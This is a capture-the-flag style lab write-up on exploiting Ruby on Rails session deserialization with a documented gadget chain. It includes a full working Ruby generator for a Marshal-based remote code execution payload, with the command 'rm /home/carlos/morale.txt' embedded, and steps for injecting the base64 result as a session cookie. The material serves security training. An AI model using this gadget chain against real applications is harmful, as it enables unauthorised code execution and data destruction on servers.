# Exploiting Ruby deserialization using a documented gadget chain
* This lab uses a serialization-based session mechanism and the Ruby on Rails framework. There is a documented exploit that enables remote code execution via a gadget chain in this framework.
	 * To solve the lab, find a documented exploit and adapt it to create a malicious serialized object containing a remote code execution payload. Then, pass this object into the website to delete the `morale.txt` file from Carlos's home directory.

### 1. Enumerate a request using Burp Repeater
* Login as _wiener_ and capture a request for enumeration

![35](https://user-images.githubusercontent.com/53956303/154779520-6c9e62d0-1a97-4ca0-905c-e4496b97a226.png)
* Decode the cookie (base64). The cookie contaisn marshaled Ruby object.

![37](https://user-images.githubusercontent.com/53956303/154780237-b5d73a5a-e4f2-4658-b7b1-ba382a25e00e.png)


### 2. Search for a public exploit for Ruby
* From Google, an exploit for [Ruby 2.x Universal RCE Deserialization Gadget chain](https://www.elttam.com/blog/ruby-deserialization/) exploit by Luke Jaknke is found.
	* this script generates a malicious cookie which contains a RCE code that we want. Modify the command in a script.
```ruby
#!/usr/bin/env ruby

class Gem::StubSpecification
  def initialize; end
end


stub_specification = Gem::StubSpecification.new
stub_specification.instance_variable_set(:@loaded_from, "|rm /home/carlos/morale.txt") # replace here to change command

puts "STEP n"
stub_specification.name rescue nil
puts


class Gem::Source::SpecificFile
  def initialize; end
end

specific_file = Gem::Source::SpecificFile.new
specific_file.instance_variable_set(:@spec, stub_specification)

other_specific_file = Gem::Source::SpecificFile.new

puts "STEP n-1"
specific_file <=> other_specific_file rescue nil
puts


$dependency_list= Gem::DependencyList.new
$dependency_list.instance_variable_set(:@specs, [specific_file, other_specific_file])

puts "STEP n-2"
$dependency_list.each{} rescue nil
puts


class Gem::Requirement
  def marshal_dump
    [$dependency_list]
  end
end

payload = Marshal.dump(Gem::Requirement.new)

puts "STEP n-3"
Marshal.load(payload) rescue nil
puts


puts "VALIDATION (in fresh ruby process):"
IO.popen("ruby -e 'Marshal.load(STDIN.read) rescue nil'", "r+") do |pipe|
  pipe.print payload
  pipe.close_write
  puts pipe.gets
  puts
end

puts "Payload (hex):"
puts payload.unpack('H*')[0]
puts


require "base64"
puts "Payload (Base64 encoded):"
puts Base64.encode64(payload)
```
### 3. Generate the payload
* Execute the script to generate the payload.
```bash
ruby generator.rb
```
* As a result, the payload is given.

![36](https://user-images.githubusercontent.com/53956303/154780107-865ebb32-e0f4-4d15-8c70-1a3dc082c8cc.png)
### 4. Modify the request and send the request to execute the inserted command
* Replace the cookie with the generated payload (Base64 encoded). Then, send the request.
	* As a result, a 500 Internal Server Error is given, but the target file is successfully deleted.

![38](https://user-images.githubusercontent.com/53956303/154780319-57051b80-a226-481a-8054-26e36a9ff9a2.png)
* The lab is solved.

![39](https://user-images.githubusercontent.com/53956303/154780346-721ff135-6a39-44a5-8bc2-c7d67b41a323.png)
